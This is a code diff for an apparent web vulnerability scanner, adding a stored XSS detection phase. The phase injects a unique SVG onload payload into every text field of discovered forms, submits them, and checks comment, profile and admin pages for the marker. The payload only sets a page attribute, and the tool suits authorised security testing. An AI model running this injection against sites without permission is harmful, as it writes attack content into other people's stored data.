@@ -3,6 +3,7 @@
 import re
 import time
 import html
+import uuid  # ✅ Phase 11
 import urllib.parse as urllib_parse
 from urllib.parse import urlparse, urlencode, urlunparse, urljoin
 from copy import deepcopy
@@ -513,3 +514,139 @@ def run_dom_xss_phase(url, base_html, TIMEOUT, headers=None, fingerprint=None,
             findings.append(finding)
 
     return findings
+
+
+# -------------------------
+# Phase 11: Stored XSS Engine (Unique payload per form)
+# -------------------------
+def _mk_uid():
+    return uuid.uuid4().hex[:10]
+
+def make_unique_stored_payload(uid: str) -> str:
+    # Payload يعمل marker واضح ونقدر نلقطه في صفحة العرض
+    # (حتى لو ما نفّذ JS فعلياً، وجود الـ UID بالـ HTML دليل تخزين/عرض)
+    return f'"><svg/onload=document.body.setAttribute("data-stored-xss","{uid}")><!--{uid}-->'
+
+def marker_present(html_text: str, uid: str) -> bool:
+    if not html_text:
+        return False
+    return (f'data-stored-xss","{uid}"' in html_text) or (f'<!--{uid}-->' in html_text) or (uid in html_text)
+
+def extract_forms(html_text: str):
+    try:
+        soup = BeautifulSoup(html_text, "html.parser")
+    except Exception:
+        return []
+    return soup.find_all("form")
+
+def build_form_submission(form, base_url: str):
+    action = form.get("action") or ""
+    method = (form.get("method") or "GET").upper()
+    target = urljoin(base_url, action)
+
+    inputs = form.find_all(["input", "textarea", "select"])
+    fields = []
+    for el in inputs:
+        name = el.get("name")
+        if not name:
+            continue
+        t = (el.get("type") or "").lower()
+        if t in ["submit", "button", "image", "file", "reset"]:
+            continue
+        fields.append((el, name, t))
+    return target, method, fields
+
+def guess_view_pages(discovered_urls: list, input_url: str):
+    keywords = ["comment", "comments", "review", "reviews", "post", "posts", "profile", "user", "admin", "feedback"]
+    base = urlparse(input_url).netloc
+    views = []
+    for u in (discovered_urls or []):
+        try:
+            if urlparse(u).netloc != base:
+                continue
+        except Exception:
+            continue
+        lu = u.lower()
+        if any(k in lu for k in keywords):
+            views.append(u)
+    if input_url and input_url not in views:
+        views.insert(0, input_url)
+    return views[:30]
+
+def run_stored_xss_phase(session, input_page_url: str, input_html: str,
+                         candidate_view_urls: list, wait_sec: float = 2.0,
+                         log=print, verbose: bool = False, now_ts=None):
+    """
+    Returns list of findings:
+    - input_url, input_action, input_method, input_fields
+    - view_url
+    - payload + uid
+    """
+    findings = []
+    forms = extract_forms(input_html)
+    if not forms:
+        return findings
+
+    for idx, form in enumerate(forms, start=1):
+        target, method, fields = build_form_submission(form, input_page_url)
+        if not fields:
+            continue
+
+        uid = _mk_uid()
+        payload = make_unique_stored_payload(uid)
+
+        data = {}
+        injected_fields = []
+        for el, name, t in fields:
+            if el.name == "textarea" or t in ["", "text", "search", "email", "url", "tel", "password"]:
+                data[name] = payload
+                injected_fields.append(name)
+            elif el.name == "select":
+                opt = el.find("option")
+                data[name] = opt.get("value") if opt and opt.get("value") is not None else (opt.text if opt else "1")
+            else:
+                val = el.get("value")
+                data[name] = val if val is not None else "1"
+
+        # Submit
+        try:
+            if method == "POST":
+                session.post(target, data=data, timeout=10, allow_redirects=True)
+            else:
+                session.get(target, params=data, timeout=10, allow_redirects=True)
+        except Exception:
+            continue
+
+        if verbose:
+            log(f"[STORED-XSS] Injected uid={uid} into form#{idx} fields={injected_fields} action={target} method={method}")
+
+        time.sleep(wait_sec)
+
+        for view_url in (candidate_view_urls or []):
+            try:
+                r = session.get(view_url, timeout=10, allow_redirects=True)
+            except Exception:
+                continue
+            if not r or r.text is None:
+                continue
+
+            if marker_present(r.text, uid):
+                findings.append({
+                    "timestamp": now_ts() if now_ts else "",
+                    "type": "Stored XSS",
+                    "input_url": input_page_url,
+                    "input_action": target,
+                    "input_method": method,
+                    "input_fields": injected_fields,
+                    "payload": payload,
+                    "uid": uid,
+                    "view_url": view_url,
+                    "status_code": getattr(r, "status_code", None),
+                    "reason": f"Stored marker uid={uid} appeared in view page"
+                })
+                if verbose:
+                    log(f"[STORED-XSS][HIT] input={input_page_url} -> view={view_url} uid={uid}")
+                break
+
+    return findings
+
